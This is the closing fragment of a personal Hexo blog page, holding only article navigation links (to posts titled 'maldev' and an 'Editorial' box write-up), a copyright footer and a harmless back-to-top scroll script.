  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/06/25/maldev/"
      title="maldev"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        maldev
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/06/16/box-Editorial-wp/"
      title="【season-5】box Editorial wp"
     >

    <p class="title-text">
      
        【season-5】box Editorial wp
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>





    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
